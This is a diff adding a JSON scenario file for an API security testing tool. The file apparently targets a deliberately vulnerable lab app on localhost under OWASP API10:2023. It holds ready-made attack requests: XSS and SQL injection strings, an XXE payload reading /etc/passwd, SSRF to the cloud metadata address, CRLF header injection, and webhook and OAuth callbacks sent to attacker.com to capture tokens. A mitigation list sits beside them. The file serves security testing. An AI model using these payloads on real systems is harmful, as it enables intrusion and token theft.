@@ -1,0 +1,292 @@
+{
+  "id": "api10-unsafe-api-consumption",
+  "name": "API10:2023 - Unsafe Consumption of APIs",
+  "category": "API Security",
+  "difficulty": "Advanced",
+  "description": "Exploits trust in third-party APIs by injecting malicious data through integrated services, webhook endpoints, and API chaining vulnerabilities",
+  "kind": "scenario",
+  "tags": [
+    "owasp-api-10",
+    "third-party-api",
+    "webhook",
+    "api-chaining",
+    "api"
+  ],
+  "target": "http://localhost:8888",
+  "estimatedDuration": "6-9 minutes",
+  "documentation": "https://owasp.org/API-Security/editions/2023/en/0xaa-unsafe-consumption-of-apis/",
+  "prerequisites": [
+    "API with third-party integrations (payment, webhooks, etc.)",
+    "crAPI or similar application with external API dependencies"
+  ],
+  "phases": [
+    {
+      "name": "reconnaissance",
+      "duration": 180,
+      "description": "Identify third-party API integrations and webhook endpoints"
+    },
+    {
+      "name": "weaponization",
+      "duration": 300,
+      "description": "Craft malicious payloads for API consumption"
+    },
+    {
+      "name": "delivery",
+      "duration": 360,
+      "description": "Inject malicious data through integrated services"
+    },
+    {
+      "name": "exploitation",
+      "duration": 420,
+      "description": "Exploit trust relationships and data validation gaps"
+    }
+  ],
+  "attackVectors": [
+    {
+      "classification": "UnsafeAPIConsumption",
+      "severity": "High",
+      "owasp": "API10:2023 Unsafe Consumption of APIs"
+    },
+    {
+      "classification": "InjectionAttack",
+      "severity": "Critical",
+      "cwe": "CWE-20: Improper Input Validation"
+    },
+    {
+      "classification": "ServerSideRequestForgery",
+      "severity": "High",
+      "cwe": "CWE-918: Server-Side Request Forgery (SSRF)"
+    }
+  ],
+  "expectedResults": {
+    "successCriteria": [
+      "Malicious webhook registered and executed",
+      "XSS/SQLi payloads in third-party data processed",
+      "SSRF through third-party API integration",
+      "OAuth token redirection to attacker endpoint",
+      "Resource exhaustion via oversized webhooks"
+    ],
+    "indicators": [
+      "Application processes malicious webhook data",
+      "No sanitization of third-party API responses",
+      "Successful XXE or injection attacks",
+      "Headers or tokens leaked to attacker domain",
+      "API chaining leads to privilege escalation"
+    ]
+  },
+  "mitigations": [
+    "Validate and sanitize all data from third-party APIs",
+    "Implement strict input validation on webhook endpoints",
+    "Use allow-lists for webhook URLs and domains",
+    "Disable XML external entity (XXE) processing",
+    "Implement rate limiting on webhook callbacks",
+    "Validate OAuth redirect URIs against allow-list",
+    "Use secure API gateways for third-party integrations",
+    "Implement request size limits for webhooks",
+    "Sign and verify webhook payloads (HMAC)",
+    "Treat third-party data as untrusted user input",
+    "Use Content Security Policy for embedded third-party content",
+    "Monitor and log all third-party API interactions",
+    "Implement circuit breakers for failing third-party APIs",
+    "Use API contracts and schema validation",
+    "Regularly audit third-party API integrations"
+  ],
+  "steps": [
+    {
+      "id": "webhook-discovery",
+      "name": "Register malicious webhook URL to capture callbacks",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/identity/api/v2/user/videos",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        },
+        "body": {
+          "title": "Test Video",
+          "webhook_url": "https://attacker.com/webhook"
+        }
+      }
+    },
+    {
+      "id": "webhook-injection-xss",
+      "name": "Inject XSS payload through webhook callback data",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/webhook/callback",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "event": "user.created",
+          "data": {
+            "username": "<script>alert('XSS')</script>",
+            "email": "test@example.com"
+          }
+        }
+      }
+    },
+    {
+      "id": "webhook-injection-sql",
+      "name": "Inject SQL payload through third-party webhook",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/webhook/callback",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "event": "payment.completed",
+          "transaction_id": "' OR '1'='1",
+          "amount": 999999
+        }
+      }
+    },
+    {
+      "id": "api-response-manipulation",
+      "name": "Force API to consume malicious third-party response",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/identity/api/v2/user/videos/convert_video",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        },
+        "body": {
+          "video_url": "https://malicious-api.com/video?payload=<script>alert(1)</script>"
+        }
+      }
+    },
+    {
+      "id": "xml-external-entity-webhook",
+      "name": "XXE injection through webhook XML processing",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/webhook/callback",
+        "headers": {
+          "Content-Type": "application/xml"
+        },
+        "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>"
+      }
+    },
+    {
+      "id": "api-chaining-privilege-escalation",
+      "name": "Chain API calls to escalate privileges via email change",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/identity/api/v2/user/change-email",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        },
+        "body": {
+          "email": "admin@victim.com",
+          "verification_token": "${CAPTURED_TOKEN}"
+        }
+      }
+    },
+    {
+      "id": "third-party-ssrf",
+      "name": "SSRF through third-party mechanic API integration",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/workshop/api/merchant/contact_mechanic",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        },
+        "body": {
+          "mechanic_api": "http://169.254.169.254/latest/meta-data/",
+          "problem_details": "Car issue"
+        }
+      }
+    },
+    {
+      "id": "webhook-oversized-payload",
+      "name": "Send oversized payload to exhaust resources",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/webhook/callback",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "event": "bulk.import",
+          "records": "${LARGE_PAYLOAD}"
+        }
+      }
+    },
+    {
+      "id": "malformed-json-injection",
+      "name": "Test JSON parsing vulnerabilities",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/webhook/callback",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\"event\": \"test\", \"data\": \"${MALFORMED}\"}"
+      }
+    },
+    {
+      "id": "response-header-injection",
+      "name": "Header injection through API consumption",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/identity/api/v2/user/videos/convert_video",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        },
+        "body": {
+          "video_url": "https://attacker.com/video",
+          "callback_headers": {
+            "X-Custom-Header": "value\\r\\nSet-Cookie: admin=true"
+          }
+        }
+      }
+    },
+    {
+      "id": "oauth-token-theft",
+      "name": "Redirect OAuth tokens to attacker-controlled endpoint",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/identity/api/v2/user/connect/google",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        },
+        "body": {
+          "oauth_callback": "https://attacker.com/steal-token",
+          "code": "malicious_code"
+        }
+      }
+    },
+    {
+      "id": "graphql-batching-abuse",
+      "name": "Abuse GraphQL batching to amplify third-party API calls",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/graphql",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "query": "query { user(id: 1) { ... } user(id: 2) { ... } [REPEAT_100_TIMES] }"
+        }
+      }
+    }
+  ]
+}
